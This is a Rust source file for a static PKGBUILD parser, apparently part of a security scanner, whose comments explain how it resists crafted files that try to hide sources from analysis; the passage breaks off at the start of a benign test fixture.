//! Static PKGBUILD parser
//!
//! Parses PKGBUILD files using regex patterns without executing bash code.
//! This is safer than sourcing the PKGBUILD but may miss dynamic constructs.

use super::{FunctionBody, ParsedPkgbuild, PkgbuildParser, SourceEntry};
use crate::error::ParseError;
use lazy_static::lazy_static;
use regex::Regex;

lazy_static! {
    // Variable assignment patterns
    static ref VAR_SIMPLE: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=([^(].*?)$"#).unwrap();
    static ref VAR_EMPTY: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=(?:""|'')?$"#).unwrap();
    static ref VAR_QUOTED: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)=["'](.*)["']$"#).unwrap();

    // Array patterns. Group 2 captures an optional `+` so `name+=(...)` (append)
    // is parsed instead of silently dropped -- a second `source+=(...)` would
    // otherwise never reach the source/checksum analyzers. A single-line array
    // is handled by ARRAY_MULTILINE_START whose content is fed to the quote-aware
    // `array_terminator` scanner (which finds the real closing paren on the same
    // line), so no separate single-line pattern is needed.
    static ref ARRAY_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\($"#).unwrap();
    // Array that starts with content on the first line (single- or multi-line).
    static ref ARRAY_MULTILINE_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)(\+?)=\((.+)$"#).unwrap();

    // An assignment-looking line we may fail to fully parse, used only to warn
    // (never silently drop attacker input without a trace).
    static ref ASSIGN_LIKE: Regex = Regex::new(r#"^[a-zA-Z_][a-zA-Z0-9_]*\+?=\("#).unwrap();

    // Function patterns
    static ref FUNC_START: Regex = Regex::new(r#"^([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\s*\)\s*\{?"#).unwrap();

    // `install=NAME` assigned inside a function body (split packages). Requires
    // a statement boundary before the name so `noinstall=` / `$install=` do not
    // match.
    static ref FUNC_INSTALL: Regex =
        Regex::new(r#"(?m)(?:^|[;{&|\s])install=(["']?)([^"'\s;}]+)"#).unwrap();

    // Comment pattern
    static ref COMMENT: Regex = Regex::new(r#"^\s*#"#).unwrap();
}

/// Static parser for PKGBUILD files
pub struct StaticParser {
    strict_mode: bool,
}

impl StaticParser {
    /// Create a new static parser
    pub fn new() -> Self {
        Self { strict_mode: false }
    }

    /// Create a parser in strict mode (fails on missing required fields)
    pub fn strict() -> Self {
        Self { strict_mode: true }
    }

    /// Parse array elements from a string
    /// Split an array body into its elements, also returning the index (in the
    /// returned list) of the first element whose COUNT or content the parser
    /// cannot know statically -- a command substitution, a whole-word
    /// `$var`, an array expansion, a brace list past the expansion limits.
    /// Everything before that index is still positionally reliable; callers
    /// that align two arrays by index must stop there.
    fn parse_array_elements_ex(
        &self,
        content: &str,
        vars: &std::collections::HashMap<String, String>,
    ) -> (Vec<String>, Option<usize>) {
        let mut elements: Vec<String> = Vec::new();
        let mut first_uncertain: Option<usize> = None;
        let mut current: Vec<(char, Q)> = Vec::new();
        let mut in_quote = false;
        let mut quote_char = ' ';
        let mut escape_next = false;

        let flush = |current: &mut Vec<(char, Q)>,
                     elements: &mut Vec<String>,
                     first_uncertain: &mut Option<usize>| {
            let text: String = current.iter().map(|(c, _)| *c).collect();
            // A bare unquoted `$name` whose value the PKGBUILD assigned
            // earlier is just that value, word-split: an empty value is zero
            // words, so `($_e 'SKIP')` is one element.
            if current.iter().all(|(_, q)| *q == Q::Un) {
                if let Some(value) = known_plain_var(&text, vars) {
                    for w in value.split_whitespace() {
                        elements.push(w.to_string());
                    }
                    current.clear();
                    return;
                }
            }
            if !text.trim().is_empty() {
                let (expanded, complete) = expand_braces(current);
                let uncertain = !complete || element_is_uncountable(current);
                for e in expanded {
                    let t = e.trim();
                    if t.is_empty() {
                        continue;
                    }
                    if uncertain && first_uncertain.is_none() {
                        *first_uncertain = Some(elements.len());
                    }
                    elements.push(t.to_string());
                }
            }
            current.clear();
        };

        for ch in content.chars() {
            if escape_next {
                current.push((ch, Q::Lit));
                escape_next = false;
                continue;
            }

            match ch {
                '\\' => escape_next = true,
                '"' | '\'' if !in_quote => {
                    in_quote = true;
                    quote_char = ch;
                }
                c if in_quote && c == quote_char => {
                    in_quote = false;
                }
                ' ' | '\t' | '\n' if !in_quote => {
                    flush(&mut current, &mut elements, &mut first_uncertain)
                }
                _ => {
                    let q = if !in_quote {
                        Q::Un
                    } else if quote_char == '"' {
                        Q::Dq
                    } else {
                        Q::Lit
                    };
                    current.push((ch, q));
                }
            }
        }
        flush(&mut current, &mut elements, &mut first_uncertain);

        (elements, first_uncertain)
    }

    /// Parse checksums into Option<String> (SKIP becomes None)
    fn parse_checksums(&self, elements: &[String]) -> Vec<Option<String>> {
        elements
            .iter()
            .map(|s| {
                let s = s.trim_matches(|c| c == '"' || c == '\'');
                if s == "SKIP" || s.is_empty() {
                    None
                } else {
                    Some(s.to_string())
                }
            })
            .collect()
    }

    /// Extract function body starting from a line.
    ///
    /// Brace balance is tracked with a quote-aware scanner so a `}` inside a
    /// string (`echo "}"`) cannot close the function early and push the rest of
    /// the body -- where a payload could hide -- outside what we parse.
    fn extract_function(&self, lines: &[&str], start_idx: usize) -> Option<(String, usize)> {
        let mut scanner = crate::textutil::BraceScanner::default();
        let mut in_function = false;
        let mut body_lines = Vec::new();
        let mut end_idx = start_idx;

        for (i, line) in lines.iter().enumerate().skip(start_idx) {
            scanner.feed(line);
            // `peak > 0` (not `depth > 0`) so a function whose whole body is on
            // one line (`pkgver() { ...; }`) -- where depth rises to 1 and falls
            // back to 0 within the same fed line -- is still recognized as
            // entered and captured.
            if scanner.peak > 0 {
                in_function = true;
            }

            if in_function {
                body_lines.push(*line);
                if scanner.depth == 0 {
                    end_idx = i;
                    break;
                }
            }
        }

        if !body_lines.is_empty() {
            Some((body_lines.join("\n"), end_idx))
        } else {
            None
        }
    }
}

impl Default for StaticParser {
    fn default() -> Self {
        Self::new()
    }
}

impl PkgbuildParser for StaticParser {
    fn parse(&self, content: &str) -> Result<ParsedPkgbuild, ParseError> {
        if content.trim().is_empty() {
            return Err(ParseError::EmptyContent);
        }

        let mut pkgbuild = ParsedPkgbuild {
            raw_content: content.to_string(),
            ..Default::default()
        };

        let lines: Vec<&str> = content.lines().collect();
        let mut i = 0;

        // Collect multi-line arrays: (name, append?, collected-content).
        let mut pending_array: Option<(String, bool, String)> = None;

        while i < lines.len() {
            let line = lines[i];
            let trimmed = line.trim();

            // Skip blank lines and whole-line comments -- but ONLY when we are
            // not in the middle of a multi-line array. Inside an open array a
            // `#`-leading (or blank) physical line can be content inside a quote
            // opened on an earlier line (bash keeps it as part of the value), so
            // it must reach the continuation handler below, which strips comments
            // quote-awarely. Dropping it here would silently delete quoted
            // content -- the same comment/quote desync class as the array-terminator bug.
            if pending_array.is_none() && (trimmed.is_empty() || COMMENT.is_match(trimmed)) {
                i += 1;
                continue;
            }

            // Strip a trailing inline comment for matching, e.g.
            // `source=("x") # note`. The stripper is quote-aware so a `#` inside
            // a value (a VCS `#commit=` fragment, a URL anchor) is preserved.
            let code = strip_inline_comment(trimmed);

            // Handle multi-line array continuation. The array only ends at a `)`
            // that is unquoted and at paren-depth 0 (`array_terminator`); a `)`
            // inside a quoted value -- e.g. a multi-line quoted source whose first
            // physical line ends in `)` -- must NOT close it, or every following
            // source/checksum line would be dropped before reaching the analyzers.
            // `take()` so we can re-store the buffer without a borrow
            // conflict when the array is not yet closed.
            if let Some((name, append, mut collected)) = pending_array.take() {
                // Strip THIS continuation line's inline comment using the quote
                // state carried from the buffer so far -- NOT the per-line `code`
                // (which `strip_inline_comment` computed with a fresh quote state).
                // A `#` on a continuation line that is still inside a quote opened
                // on an earlier array line is part of the value, not a comment;
                // stripping it with a reset state would delete the real closing
                // quote/paren and silently drop the whole array (the desync that
                // let comment text hide array content).
                //
                // The join `\n` is pushed BEFORE computing the carried state so a
                // trailing `\` line-continuation escapes the newline exactly as
                // `array_terminator` (which re-scans the whole buffer) sees it. If
                // the state were computed first, the seed would carry escaped=true
                // into the next line while array_terminator carries escaped=false
                // after consuming the `\n` -- they would disagree, and a leading
                // `"` on the next line would be eaten as escaped, exposing its `#`
                // as a bogus comment and silently dropping the trailing source.
                collected.push('\n');
                let (in_single, in_double, escaped) = quote_state_at_end(&collected);
                let cline = strip_inline_comment_stateful(trimmed, in_single, in_double, escaped);
                collected.push_str(cline);

                if let Some(end) = array_terminator(&collected) {
                    let (elements, unc) =
                        self.parse_array_elements_ex(&collected[..end], &pkgbuild.variables);
                    self.assign_array(&mut pkgbuild, &name, elements, append, unc);
                    // pending_array already None (taken); leave it closed.
                } else {
                    pending_array = Some((name, append, collected));
                }
                i += 1;
                continue;
            }

            // Check for array start (multi-line, empty first line)
            if let Some(caps) = ARRAY_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let append = !caps.get(2).unwrap().as_str().is_empty();
                pending_array = Some((name, append, String::new()));
                i += 1;
                continue;
            }

            // Check for multi-line array with content on first line
            if let Some(caps) = ARRAY_MULTILINE_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                let append = !caps.get(2).unwrap().as_str().is_empty();
                let first_content = caps.get(3).unwrap().as_str();
                // Single-line only when the closing `)` is unquoted at depth 0.
                // A quoted `)` in the first element does not close the array.
                if let Some(end) = array_terminator(first_content) {
                    let (elements, unc) =
                        self.parse_array_elements_ex(&first_content[..end], &pkgbuild.variables);
                    self.assign_array(&mut pkgbuild, &name, elements, append, unc);
                } else {
                    pending_array = Some((name, append, first_content.to_string()));
                }
                i += 1;
                continue;
            }

            // Check for function definition
            if let Some(caps) = FUNC_START.captures(code) {
                let name = caps.get(1).unwrap().as_str().to_string();
                if let Some((body, end_idx)) = self.extract_function(&lines, i) {
                    // Split packages set `install=` inside `package_foo()`;
                    // the function body is swallowed whole below, so harvest
                    // those assignments here or they never reach the scanner.
                    for caps in FUNC_INSTALL.captures_iter(&body) {
                        let v = caps.get(2).unwrap().as_str().to_string();
                        pkgbuild.install = Some(v.clone());
                        pkgbuild.installs.push(v);
                    }
                    pkgbuild.functions.insert(
                        name.clone(),
                        FunctionBody {
                            name,
                            content: body,
                            line_start: i + 1,
                            line_end: end_idx + 1,
                        },
                    );
                    i = end_idx + 1;
                    continue;
                }
            }

            // Check for quoted variable assignment
            if let Some(caps) = VAR_QUOTED.captures(code) {
                let name = caps.get(1).unwrap().as_str();
                let value = caps.get(2).unwrap().as_str();
                self.assign_variable(&mut pkgbuild, name, value);
                i += 1;
                continue;
            }

            // `name=` / `name=""` / `name=''`: an empty string (zero words when
            // used bare), which VAR_SIMPLE (one or more value chars) misses.
            if let Some(caps) = VAR_EMPTY.captures(code) {
                // (only the scratch-variable table: an empty `install=` or
                // `pkgname=` must not become a real, empty entry)
                pkgbuild
                    .variables
                    .insert(caps.get(1).unwrap().as_str().to_string(), String::new());
                i += 1;
                continue;
            }

            // Check for simple variable assignment
            if let Some(caps) = VAR_SIMPLE.captures(code) {
                let name = caps.get(1).unwrap().as_str();
                let value = caps
                    .get(2)
                    .unwrap()
                    .as_str()
                    .trim_matches(|c| c == '"' || c == '\'');
                self.assign_variable(&mut pkgbuild, name, value);
                i += 1;
                continue;
            }

            // Nothing matched. If the line *looked* like an array assignment we
            // could not fully parse, leave a trace rather than dropping
            // attacker-controlled input unobserved (a silently-dropped
            // `source+=(...)` would escape source/checksum analysis).
            if ASSIGN_LIKE.is_match(code) {
                tracing::debug!("unparsed assignment-like line {}: {:?}", i + 1, code);
            }

            i += 1;
        }

        // Defense in depth: an array whose closing `)` never arrived (an
        // unbalanced quote/paren in a crafted PKGBUILD) must NOT be silently
        // dropped -- that would re-blind the source/checksum analyzers, which
        // iterate the parsed `source`/`checksums` fields rather than the raw
        // text (the comment/quote desync evasion class). Flush the buffered content
        // best-effort so it still reaches the analyzers, and warn loudly.
        if let Some((name, append, collected)) = pending_array.take() {
            tracing::warn!(
                "unterminated array `{}=(` at end of PKGBUILD: flushing {} buffered bytes so the \
                 contents are still scanned (possible evasion attempt or malformed PKGBUILD)",
                name,
                collected.len()
            );
            let (elements, unc) = self.parse_array_elements_ex(&collected, &pkgbuild.variables);
            self.assign_array(&mut pkgbuild, &name, elements, append, unc);
        }

        // makepkg appends `source_<arch>`, `<algo>sums_<arch>` and
        // `depends_<arch>` to the generic arrays; fold them in so every
        // analyzer sees the effective lists.
        pkgbuild.merge_arch_arrays();

        // Validate required fields in strict mode
        if self.strict_mode {
            if pkgbuild.pkgname.is_empty() {
                return Err(ParseError::MissingField("pkgname".to_string()));
            }
            if pkgbuild.pkgver.is_empty() {
                return Err(ParseError::MissingField("pkgver".to_string()));
            }
            if pkgbuild.pkgrel.is_empty() {
                return Err(ParseError::MissingField("pkgrel".to_string()));
            }
        }

        Ok(pkgbuild)
    }
}

impl StaticParser {
    /// Assign a scalar variable to the PKGBUILD structure
    fn assign_variable(&self, pkgbuild: &mut ParsedPkgbuild, name: &str, value: &str) {
        match name {
            "pkgname" => pkgbuild.pkgname = vec![value.to_string()],
            "pkgver" => pkgbuild.pkgver = value.to_string(),
            "pkgrel" => pkgbuild.pkgrel = value.to_string(),
            "epoch" => pkgbuild.epoch = Some(value.to_string()),
            "pkgdesc" => pkgbuild.pkgdesc = Some(value.to_string()),
            "url" => pkgbuild.url = Some(value.to_string()),
            "install" => {
                pkgbuild.install = Some(value.to_string());
                pkgbuild.installs.push(value.to_string());
            }
            "changelog" => pkgbuild.changelog = Some(value.to_string()),
            _ => {
                pkgbuild
                    .variables
                    .insert(name.to_string(), value.to_string());
            }
        }
    }

    /// Assign an array variable to the PKGBUILD structure
    /// Assign (or, when `append` is true for a `name+=(...)` form, extend) an
    /// array field.
    fn assign_array(
        &self,
        pkgbuild: &mut ParsedPkgbuild,
        name: &str,
        elements: Vec<String>,
        append: bool,
        uncertain: Option<usize>,
    ) {
        // Where the first uncountable element of this array will sit once
        // appended, recorded for the analyzers that align arrays by index.
        let base = if append {
            match name {
                "source" => pkgbuild.source.len(),
                "md5sums" => pkgbuild.checksums.md5sums.len(),
                "sha1sums" => pkgbuild.checksums.sha1sums.len(),
                "sha256sums" => pkgbuild.checksums.sha256sums.len(),
                "sha512sums" => pkgbuild.checksums.sha512sums.len(),
                "b2sums" => pkgbuild.checksums.b2sums.len(),
                _ => pkgbuild
                    .variables
                    .get(name)
                    .and_then(|v| serde_json::from_str::<Vec<String>>(v).ok())
                    .map_or(0, |v| v.len()),
            }
        } else {
            0
        };
        if !append {
            pkgbuild.uncertain_from.remove(name);
        }
        if let Some(u) = uncertain {
            let at = base + u;
            pkgbuild
                .uncertain_from
                .entry(name.to_string())
                .and_modify(|e| *e = (*e).min(at))
                .or_insert(at);
        }
        // For Vec<String> fields: replace, or extend when appending.
        let set = |dst: &mut Vec<String>, mut new: Vec<String>| {
            if append {
                dst.append(&mut new);
            } else {
                *dst = new;
            }
        };
        match name {
            "pkgname" => set(&mut pkgbuild.pkgname, elements),
            "arch" => set(&mut pkgbuild.arch, elements),
            "license" => set(&mut pkgbuild.license, elements),
            "depends" => set(&mut pkgbuild.depends, elements),
            "makedepends" => set(&mut pkgbuild.makedepends, elements),
            "checkdepends" => set(&mut pkgbuild.checkdepends, elements),
            "optdepends" => set(&mut pkgbuild.optdepends, elements),
            "provides" => set(&mut pkgbuild.provides, elements),
            "conflicts" => set(&mut pkgbuild.conflicts, elements),
            "replaces" => set(&mut pkgbuild.replaces, elements),
            "backup" => set(&mut pkgbuild.backup, elements),
            "options" => set(&mut pkgbuild.options, elements),
            "validpgpkeys" => set(&mut pkgbuild.validpgpkeys, elements),
            "source" => {
                let mut parsed: Vec<SourceEntry> =
                    elements.iter().map(|s| SourceEntry::parse(s)).collect();
                if append {
                    pkgbuild.source.append(&mut parsed);
                } else {
                    pkgbuild.source = parsed;
                }
            }
            "md5sums" => self.set_checksums(&mut pkgbuild.checksums.md5sums, &elements, append),
            "sha1sums" => self.set_checksums(&mut pkgbuild.checksums.sha1sums, &elements, append),
            "sha256sums" => {
                self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append)
            }
            "sha512sums" => {
                self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append)
            }
            "b2sums" => self.set_checksums(&mut pkgbuild.checksums.b2sums, &elements, append),
            _ => {
                // Store as JSON array in variables. A `+=` extends what is
                // there so arch-specific arrays (`source_x86_64+=(...)`) keep
                // every element for `merge_arch_arrays`.
                let mut all: Vec<String> = if append {
                    pkgbuild
                        .variables
                        .get(name)
                        .and_then(|v| serde_json::from_str(v).ok())
                        .unwrap_or_default()
                } else {
                    Vec::new()
                };
                all.extend(elements);
                pkgbuild
                    .variables
                    .insert(name.to_string(), serde_json::to_string(&all).unwrap());
            }
        }
    }

    /// Replace or extend a checksum array, mapping `SKIP`/empty to `None`.
    fn set_checksums(&self, dst: &mut Vec<Option<String>>, elements: &[String], append: bool) {
        let mut parsed = self.parse_checksums(elements);
        if append {
            dst.append(&mut parsed);
        } else {
            *dst = parsed;
        }
    }
}

/// Cap on the elements one brace expression may produce.
const MAX_BRACE_EXPANSION: usize = 256;
/// An element longer than this is not brace-expanded (and is reported as
/// uncountable if it holds an unquoted brace): expansion must stay linear in
/// attacker-controlled input.
const MAX_BRACE_ELEMENT_LEN: usize = 4096;
/// Deepest brace nesting that is expanded.
const MAX_BRACE_DEPTH: usize = 32;

/// How a character of an array element was written.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Q {
    /// Single-quoted or backslash-escaped: always literal.
    Lit,
    /// Inside double quotes: `$` expansions happen, braces do not.
    Dq,
    /// Unquoted: braces and `$` expansions both happen.
    Un,
}

/// Whether the number of words this element becomes (or its content) cannot
/// be known statically. Single-quoted text never counts; a quoted
/// `"$(cmd)"` or `"$var"` is exactly one word and does not count either.
fn element_is_uncountable(chars: &[(char, Q)]) -> bool {
    let live = |i: usize| chars[i].1 != Q::Lit;
    for i in 0..chars.len() {
        if !live(i) {
            continue;
        }
        let c = chars[i].0;
        let next = chars.get(i + 1).map(|(c, _)| *c);
        // unquoted command substitution / backticks can split into many words
        if chars[i].1 == Q::Un && ((c == '$' && next == Some('(')) || c == '`') {
            return true;
        }
        // whole-array expansion, quoted or not
        if c == '['
            && matches!(chars.get(i + 1), Some(('@' | '*', _)))
            && matches!(chars.get(i + 2), Some((']', _)))
        {
            return true;
        }
    }
    // a bare unquoted `$name` / `${...}` word may be empty or split
    if chars.iter().all(|(_, q)| *q == Q::Un) {
        let t: String = chars.iter().map(|(c, _)| *c).collect();
        if let Some(rest) = t.strip_prefix('$') {
            let simple = !rest.is_empty()
                && (rest.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                    || (rest.starts_with('{') && rest.ends_with('}') && !rest[1..].contains('{')));
            if simple {
                return true;
            }
        }
    }
    false
}

/// The value of a whole-word `$name` / `${name}` that the PKGBUILD assigned as a
/// plain string with nothing left to expand or glob.
fn known_plain_var(word: &str, vars: &std::collections::HashMap<String, String>) -> Option<String> {
    let rest = word.strip_prefix('$')?;
    let name = match rest.strip_prefix('{') {
        Some(b) => b.strip_suffix('}')?,
        None => rest,
    };
    if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
        return None;
    }
    let v = vars.get(name)?;
    let v = v.trim_matches(|c| c == '"' || c == '\'');
    (!v.contains(['$', '`', '*', '?', '[', '{', '\\', '"', '\'', '(', ')'])).then(|| v.to_string())
}

/// Parse a brace sequence body (`1..5`, `a..e`, `01..10..3`) into its items,
/// or `None` when it is not one (or would exceed `limit` items).
fn brace_sequence(body: &str, limit: usize) -> Option<Result<Vec<String>, ()>> {
    let parts: Vec<&str> = body.split("..").collect();
    if !(2..=3).contains(&parts.len()) {
        return None;
    }
    let step_raw = parts
        .get(2)
        .map(|s| s.parse::<i64>().ok())
        .unwrap_or(Some(1))?;
    let step = step_raw.unsigned_abs().max(1) as i64;
    let num = |s: &str| -> Option<i64> {
        let digits = s.strip_prefix('-').unwrap_or(s);
        (!digits.is_empty() && digits.len() <= 12 && digits.bytes().all(|b| b.is_ascii_digit()))
            .then(|| s.parse().ok())
            .flatten()
    };
    if let (Some(a), Some(b)) = (num(parts[0]), num(parts[1])) {
        let width = if parts[0].trim_start_matches('-').starts_with('0')
            && parts[0].trim_start_matches('-').len() > 1
            || parts[1].trim_start_matches('-').starts_with('0')
                && parts[1].trim_start_matches('-').len() > 1
        {
            parts[0].len().max(parts[1].len())
        } else {
            0
        };
        let count = ((a - b).unsigned_abs() / step as u64 + 1) as usize;
        if count > limit {
            return Some(Err(()));
        }
        let dir = if a <= b { step } else { -step };
        let mut out = Vec::new();
        let mut v = a;
        while (dir > 0 && v <= b) || (dir < 0 && v >= b) {
            out.push(if width > 0 {
                format!("{v:0width$}")
            } else {
                v.to_string()
            });
            v += dir;
        }
        return Some(Ok(out));
    }
    let single = |s: &str| {
        let mut it = s.chars();
        match (it.next(), it.next()) {
            (Some(c), None) if c.is_ascii_alphabetic() => Some(c as u32),
            _ => None,
        }
    };
    let (a, b) = (single(parts[0])?, single(parts[1])?);
    let count = ((a as i64 - b as i64).unsigned_abs() / step as u64 + 1) as usize;
    if count > limit {
        return Some(Err(()));
    }
    let dir = if a <= b { step } else { -step };
    let mut out = Vec::new();
    let mut v = a as i64;
    while (dir > 0 && v <= b as i64) || (dir < 0 && v >= b as i64) {
        out.push(char::from_u32(v as u32)?.to_string());
        v += dir;
    }
    Some(Ok(out))
}

/// Expand bash brace lists (`a{,.asc}`, `x{1,2}y`, `S{K..K}IP`) in the unquoted
/// parts of one array element, the way bash does. Quoted or escaped braces,
/// `${...}` parameter expansions and groups with neither a top-level comma nor
/// a sequence are left alone. The second value is `false` when an expansion
/// was needed but not carried out (too long, too deeply nested, too many
/// results): the caller must then treat the element as uncountable.
fn expand_braces(chars: &[(char, Q)]) -> (Vec<String>, bool) {
    let whole = || chars.iter().map(|(c, _)| *c).collect::<String>();
    let has_brace = chars.iter().any(|(c, q)| *c == '{' && *q == Q::Un);
    if !has_brace {
        return (vec![whole()], true);
    }
    if chars.len() > MAX_BRACE_ELEMENT_LEN {
        return (vec![whole()], false);
    }
    let n = chars.len();
    // `${...}` interiors are opaque; matching braces found in ONE linear pass.
    let mut opaque = vec![false; n];
    let mut close: Vec<Option<usize>> = vec![None; n];
    {
        let mut i = 0;
        let mut stack: Vec<usize> = Vec::new();
        while i < n {
            let (c, q) = chars[i];
            if q == Q::Un && c == '$' && matches!(chars.get(i + 1), Some(('{', Q::Un))) {
                let mut d = 0usize;
                let mut j = i + 1;
                while j < n {
                    match chars[j] {
                        ('{', Q::Un) => d += 1,
                        ('}', Q::Un) => {
                            d -= 1;
                            if d == 0 {
                                break;
                            }
                        }
                        _ => {}
                    }
                    j += 1;
                }
                let end = j.min(n - 1);
                for o in opaque.iter_mut().take(end + 1).skip(i) {
                    *o = true;
                }
                i = end + 1;
                continue;
            }
            if q == Q::Un {
                if c == '{' {
                    stack.push(i);
                } else if c == '}' {
                    if let Some(open) = stack.pop() {
                        close[open] = Some(i);
                    }
                }
            }
            i += 1;
        }
    }
    let text = |lo: usize, hi: usize| -> String { chars[lo..hi].iter().map(|(c, _)| *c).collect() };

    struct Ctx<'a> {
        chars: &'a [(char, Q)],
        opaque: &'a [bool],
        close: &'a [Option<usize>],
        budget: usize,
    }
    fn go(cx: &mut Ctx, lo: usize, hi: usize, depth: usize) -> Option<Vec<String>> {
        if depth > MAX_BRACE_DEPTH {
            return None;
        }
        let t = |a: usize, b: usize| -> String { cx.chars[a..b].iter().map(|(c, _)| *c).collect() };
        let mut i = lo;
        while i < hi {
            if cx.chars[i] == ('{', Q::Un) && !cx.opaque[i] {
                if let Some(e) = cx.close[i].filter(|e| *e < hi) {
                    // top-level commas of this group
                    let mut commas = Vec::new();
                    let mut j = i + 1;
                    while j < e {
                        if cx.chars[j] == ('{', Q::Un) && !cx.opaque[j] {
                            if let Some(c2) = cx.close[j].filter(|c2| *c2 < e) {
                                j = c2 + 1;
                                continue;
                            }
                        } else if cx.chars[j] == (',', Q::Un) && !cx.opaque[j] {
                            commas.push(j);
                        }
                        j += 1;
                    }
                    let items: Option<Vec<String>> = if !commas.is_empty() {
                        let mut alts = Vec::new();
                        let mut start = i + 1;
                        for &c in &commas {
                            alts.push((start, c));
                            start = c + 1;
                        }
                        alts.push((start, e));
                        let mut out = Vec::new();
                        for (a, b) in alts {
                            out.extend(go(cx, a, b, depth + 1)?);
                        }
                        Some(out)
                    } else if cx.chars[i + 1..e].iter().all(|(_, q)| *q == Q::Un) {
                        match brace_sequence(&t(i + 1, e), cx.budget) {
                            Some(Ok(v)) => Some(v),
                            Some(Err(())) => return None,
                            None => None,
                        }
                    } else {
                        None
                    };
                    if let Some(items) = items {
                        let prefix = t(lo, i);
                        let tails = go(cx, e + 1, hi, depth + 1)?;
                        let mut out = Vec::new();
                        for a in &items {
                            for tail in &tails {
                                if cx.budget == 0 {
                                    return None;
                                }
                                cx.budget -= 1;
                                out.push(format!("{prefix}{a}{tail}"));
                            }
                        }
                        return Some(out);
                    }
                }
            }
            i += 1;
        }
        Some(vec![t(lo, hi)])
    }
    let mut cx = Ctx {
        chars,
        opaque: &opaque,
        close: &close,
        budget: MAX_BRACE_EXPANSION,
    };
    match go(&mut cx, 0, n, 0) {
        Some(v) => (v, true),
        None => (vec![text(0, n)], false),
    }
}

/// Truncate a line at a trailing inline comment, preserving `#` characters that
/// appear inside single/double quotes (so a VCS `#commit=` fragment or a URL
/// anchor in a quoted source value is not mistaken for a comment). A `#` only
/// starts a comment when it is unquoted and preceded by whitespace (or starts
/// the line) -- matching how the shell tokenizes comments.
fn strip_inline_comment(line: &str) -> &str {
    strip_inline_comment_stateful(line, false, false, false)
}

/// Like [`strip_inline_comment`], but seeded with the quote/escape state carried
/// from preceding physical lines of the SAME multi-line array value.
///
/// `strip_inline_comment` resets quote state at the start of every line, which is
/// correct for a standalone line but WRONG for an array continuation line that is
/// still inside a quote opened on an earlier line: there a `#` is part of the
/// quoted value, not a comment. Stripping it with a reset state deletes the real
/// closing quote/paren so [`array_terminator`] never finds the terminator and the
/// whole array is silently dropped -- the comment/quote desync evasion. The
/// caller seeds this with [`quote_state_at_end`] of the accumulated buffer so the
/// two scanners agree on what is quoted.
fn strip_inline_comment_stateful(
    line: &str,
    mut in_single: bool,
    mut in_double: bool,
    mut escaped: bool,
) -> &str {
    let bytes = line.as_bytes();
    // Start-of-line counts as a word boundary. After an unquoted `(` the next
    // token can begin a shell comment (`source=(#"old-url"` is a comment in
    // bash, not a source element) — matching that is what keeps CHK-006 from
    // counting a commented-out source as a live entry (issue #24).
    let mut at_word_boundary = true;
    for (i, &b) in bytes.iter().enumerate() {
        if escaped {
            escaped = false;
            at_word_boundary = false;
            continue;
        }
        match b {
            b'\\' if !in_single => {
                escaped = true;
                at_word_boundary = false;
            }
            b'\'' if !in_double => {
                in_single = !in_single;
                at_word_boundary = false;
            }
            b'"' if !in_single => {
                in_double = !in_double;
                at_word_boundary = false;
            }
            b'#' if !in_single && !in_double && at_word_boundary => {
                return line[..i].trim_end();
            }
            b' ' | b'\t' => at_word_boundary = true,
            // Unquoted `(` opens a new token context: `#` immediately after is a
            // comment in bash (`a=(#cmt` / `a=( #cmt`). `=` alone is NOT a
            // boundary (`a=#foo` assigns the literal `#foo`).
            b'(' if !in_single && !in_double => at_word_boundary = true,
            _ => at_word_boundary = false,
        }
    }
    line
}

/// Quote/escape state (in_single, in_double, escaped) after scanning `buf`.
///
/// Used to seed [`strip_inline_comment_stateful`] for the next physical line of a
/// multi-line array, so comment-stripping agrees with [`array_terminator`] (which
/// re-scans the whole accumulated buffer). Mirrors the same quoting rules: `\`
/// escapes only outside single quotes; single quotes are literal; `"`/`'` toggle.
/// Parens and `#` are irrelevant to quote state and ignored here (the buffer this
/// scans has already had its unquoted comments stripped).
fn quote_state_at_end(buf: &str) -> (bool, bool, bool) {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    for ch in buf.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        match ch {
            '\\' if !in_single => escaped = true,
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            _ => {}
        }
    }
    (in_single, in_double, escaped)
}

/// Find the byte index of the `)` that closes an array body, where `buf` is the
/// accumulated text *after* the opening `name=(`. The terminator is the first
/// `)` that is **unquoted** and at **nested-paren depth 0**. Single/double quote
/// and backslash-escape state is tracked across the whole buffer (matching
/// [`crate::textutil::BraceScanner`]'s convention: `\` escapes outside single
/// quotes; single quotes are literal), so a `)` inside a quoted value -- or a
/// balanced `(...)` inside an unquoted value -- is not mistaken for the end of
/// the array. Returns `None` when the array is still open (more lines follow).
///
/// This is the quote-aware replacement for the old `ends_with(')')` /
/// `trim_end_matches(')')` heuristic, which let an attacker terminate the array
/// early with a quoted `)` and hide every following source/checksum line from
/// the analyzers.
fn array_terminator(buf: &str) -> Option<usize> {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut depth: u32 = 0;

    for (idx, ch) in buf.char_indices() {
        if escaped {
            escaped = false;
            continue;
        }
        match ch {
            '\\' if !in_single => escaped = true,
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '(' if !in_single && !in_double => depth += 1,
            ')' if !in_single && !in_double => {
                if depth == 0 {
                    return Some(idx);
                }
                depth -= 1;
            }
            _ => {}
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_PKGBUILD: &str = r#"
# Maintainer: Example <example@example.com>
pkgname=example-package
pkgver=1.0.0
pkgrel=1
pkgdesc="An example package"
arch=('x86_64' 'aarch64')
url="https://example.com"
license=('MIT')
